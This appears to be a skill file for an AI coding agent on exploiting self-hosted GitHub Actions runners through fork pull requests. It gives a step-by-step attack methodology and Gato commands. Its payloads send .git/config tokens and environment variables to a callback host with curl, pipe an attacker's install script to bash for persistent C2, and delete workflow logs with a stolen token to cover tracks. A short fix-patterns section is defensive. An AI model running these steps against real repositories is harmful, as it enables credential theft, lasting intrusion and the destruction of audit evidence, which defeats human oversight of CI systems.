---
name: self-hosted-runner-poisoning
description: >
  Use when hunting self-hosted GitHub Actions runner vulnerabilities where fork pull
  requests can execute on privileged non-ephemeral runners. Trigger on: "self-hosted
  runner", "runs-on self-hosted", "fork PR workflow", "non-ephemeral runner",
  "first-time contributor approval", "runner images", "azure-builds runner",
  "outside collaborator approval", "runs-on matrix", "persistent runner",
  "Gato GitHub Attack Toolkit", "runner agent", self-hosted CI/CD runner abuse,
  "git config token", "workflow log deletion", runner C2.
license: MIT
compatibility: Designed for Claude Code. Gato toolkit recommended for enumeration.
metadata:
  category: cicd
  version: "0.1"
  source: https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/
  source_types: blog_post
---

# Self-Hosted Runner Poisoning

## What Is Broken and Why

GitHub-hosted runners are ephemeral and isolated. Self-hosted runners are not — they
persist between runs, share state, and often carry long-lived credentials baked into the
environment. When a repository allows fork pull requests to run on self-hosted runners
(especially with the default "Require approval for first-time contributors" setting),
an attacker who has made even one accepted contribution can submit a PR that modifies
the workflow's `runs-on` field to target a privileged self-hosted runner and execute
arbitrary code on it. Non-ephemeral runners retain their working directory, installed
tooling, and cached credentials across runs — making them ideal for persistence and
lateral movement into the broader infrastructure.

## Key Signals

- `runs-on: self-hosted` or named runner labels (`azure-builds`, `macos-vmware`, `[self-hosted, linux]`) in workflow files
- Repository setting: "Require approval for first-time contributors" (default) rather than "Require approval for all outside collaborators"
- Fork PR workflows that use a `matrix.os` or `matrix.runner` whose values the PR author can influence
- Non-ephemeral runner: runner directory persists, processes survive between runs
- Workflow checks out code without `persist-credentials: false` → `.git/config` contains embedded `GITHUB_TOKEN`
- `runs-on` field uses an expression: `runs-on: ${{ matrix.os }}` or `runs-on: ${{ inputs.runner }}`
- Secrets or cloud credentials (`AWS_*`, `AZURE_*`, vCenter creds) available in runner environment
- Repository contains build infrastructure workflows (Packer, Terraform, image builds)

## Methodology

1. Identify repositories using self-hosted runners:
   ```bash
   gato enumerate --target ORG --type org
   # or manually:
   grep -rn 'self-hosted\|runs-on:' .github/workflows/ | grep -v 'ubuntu-latest\|windows-latest\|macos-latest'
   ```
2. Check the fork PR approval policy: Settings → Actions → Fork pull request workflows.
   "Require approval for first-time contributors" = vulnerable after one merged PR.
3. Check if `runs-on` uses a matrix or expression that a PR author can modify.
4. Submit one legitimate PR (typo fix, docs update) to gain "not first-time contributor" status.
5. In a second PR, modify the workflow to:
   - Change `runs-on` to target a self-hosted runner label
   - Replace or append a malicious step to the workflow
6. Confirm code execution via OOB callback.
7. From runner context: extract `.git/config` for `GITHUB_TOKEN`, enumerate environment variables, access credential stores.
8. Optionally install persistent runner agent for long-term access.
9. Cover tracks: delete workflow run logs via API using stolen token.

## Payloads & Tools

```bash
# Gato: enumerate org for self-hosted runner exposure
gato enumerate --target ORG --type org --output results.json
gato attack --target REPO --self-hosted

# Modify runs-on in workflow PR to target self-hosted runner
# Change in linter.yml or any triggered workflow:
-    runs-on: ubuntu-latest
+    runs-on: ${{ matrix.os }}
+    strategy:
+      matrix:
+        os: [self-hosted-runner-label]
```

```bash
# Malicious step payload — extract token from .git/config
- name: exfil
  run: |
    cat .git/config | base64 | curl -d @- https://CALLBACK
    printenv | curl -d @- https://CALLBACK

# Install persistent runner agent (C2)
- name: persist
  run: |
    curl -sSfL https://ATTACKER/runner-install.sh | bash
    # Registers new runner connected to attacker's private repo
    # Runs as background process, survives workflow completion
```

```bash
# Delete workflow run logs to remove evidence (using stolen GITHUB_TOKEN)
curl -L -X DELETE \
  -H "Authorization: Bearer STOLEN_TOKEN" \
  https://api.github.com/repos/ORG/REPO/actions/runs/RUN_ID

# List recent runs to find IDs to delete
gh api repos/ORG/REPO/actions/runs --jq '.workflow_runs[].id'
```

## Bypass Techniques

- **First-time contributor bypass**: submit one benign PR (typo, docs) to transition from "first-time contributor" to "returning contributor" — subsequent PRs skip approval
- **Matrix expression hijack**: if `runs-on: ${{ matrix.os }}` and `matrix` is defined in a file the PR modifies, attacker controls the runner label
- **Workflow file in subdirectory**: some repos call reusable workflows stored in subdirectories; a PR modifying those files can alter `runs-on` indirectly
- **Composite action replacement**: replace a composite action called by the workflow with malicious steps — `runs-on` is inherited from the calling workflow
- **Non-ephemeral state abuse**: if runner is not ephemeral, artifacts from previous runs (cached tokens, SSH keys, build outputs) may be accessible in the working directory without needing fresh exfiltration
- **`persist-credentials: true` (default)**: `actions/checkout` embeds `GITHUB_TOKEN` in `.git/config` — readable by any subsequent step

## Exploitation Scenarios

**Scenario 1 — Infrastructure takeover via image build runner**
Setup: Repository builds VM/container images using self-hosted runners with vCenter/Azure credentials. Fork PR approval requires only first-time contributor check.
Trigger: Attacker merges one typo-fix PR, then submits second PR modifying `runs-on` to target the build runner.
Impact: Runner environment yields vCenter admin credentials, Azure storage keys, SSH keys. Attacker can poison all future runner images deployed globally.

**Scenario 2 — Persistent C2 via runner agent**
Setup: Self-hosted runner is non-ephemeral (shared VM, no cleanup between runs).
Trigger: Malicious PR step installs a secondary GitHub Actions runner agent registered to attacker's private repo.
Impact: Attacker maintains persistent access to the runner machine — survives PR close, branch delete, and log wipe. Can re-trigger at will via private repo workflows.

**Scenario 3 — Token theft + log deletion**
Setup: Workflow uses default `actions/checkout` (persist-credentials: true).
Trigger: Malicious step reads `.git/config`, exfiltrates `GITHUB_TOKEN` with write permissions.
Impact: Attacker uses stolen token to push to protected branches, create releases, delete evidence (workflow logs deleted via API), and enumerate other secrets before token expires.

## False Positives

- Self-hosted runners in a repo where fork PRs are fully disabled
- Approval policy set to "Require approval for all outside collaborators" — attacker's PR never runs
- Runner IS ephemeral (fresh VM per job) — persistence techniques don't apply, but token exfiltration still works
- `runs-on` hardcoded (not an expression) — attacker cannot redirect to a different runner label via PR

## Fix Patterns

```yaml
# WRONG: runs-on from matrix that PR author controls
runs-on: ${{ matrix.os }}

# CORRECT: hardcode runner label, don't expose it as a modifiable value
runs-on: ubuntu-latest
# or for self-hosted, use a fixed label not exposed in PR-modifiable files:
runs-on: [self-hosted, linux, internal]
```

```yaml
# WRONG: default persist-credentials embeds token in .git/config
- uses: actions/checkout@v4

# CORRECT: don't persist credentials when not needed
- uses: actions/checkout@v4
  with:
    persist-credentials: false
```

- Change fork PR approval to **"Require approval for all outside collaborators"** (not just first-time)
- Use ephemeral runners (fresh VM per job) — eliminates persistence and state leakage
- Restrict self-hosted runners to internal workflows only; never allow fork PRs to target them
- Audit runner labels in all workflow files; alert on PRs that modify `runs-on` values
- Rotate all credentials accessible from runner environments regularly

## Related Skills

[[pwn-request]] is the most common trigger path that lands code on a self-hosted runner — a `pull_request_target` workflow that checks out PR code and runs it on a persistent self-hosted runner is the textbook combination. From there, [[github-actions-script-injection]] payloads can run to exfiltrate long-lived credentials stored in the runner environment. Once persistent access is established, [[github-actions-cache-poisoning]] can be executed from the compromised runner to poison downstream privileged workflows without requiring another PR.
